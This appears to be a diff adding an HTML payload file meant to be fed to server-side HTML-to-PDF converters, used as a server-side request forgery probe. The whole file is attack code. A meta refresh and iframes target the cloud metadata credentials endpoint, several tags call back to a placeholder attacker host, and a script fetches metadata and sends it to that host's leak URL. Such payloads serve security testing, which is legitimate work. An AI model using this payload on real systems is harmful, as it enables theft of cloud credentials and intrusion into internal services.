@@ -1,0 +1,13 @@
+<!-- Feed to a server-side HTML->PDF converter (wkhtmltopdf / headless-Chrome / WeasyPrint).
+     The renderer fetches these server-side -> SSRF / cloud-metadata read into the PDF. -->
+<!DOCTYPE html><html><head>
+<meta http-equiv="refresh" content="0;url=http://169.254.169.254/latest/meta-data/iam/security-credentials/">
+</head><body>
+<h1>html-to-pdf SSRF probe</h1>
+<img src="http://ATTACKER-HOST/htmltopdf-img-ssrf">
+<iframe src="http://169.254.169.254/latest/meta-data/"></iframe>
+<iframe src="http://ATTACKER-HOST/htmltopdf-iframe-ssrf"></iframe>
+<link rel="stylesheet" href="http://ATTACKER-HOST/htmltopdf-css-ssrf">
+<script>fetch('http://169.254.169.254/latest/meta-data/').then(r=>r.text()).then(t=>location='http://ATTACKER-HOST/leak?d='+encodeURIComponent(t))</script>
+<object data="http://ATTACKER-HOST/htmltopdf-object-ssrf"></object>
+</body></html>
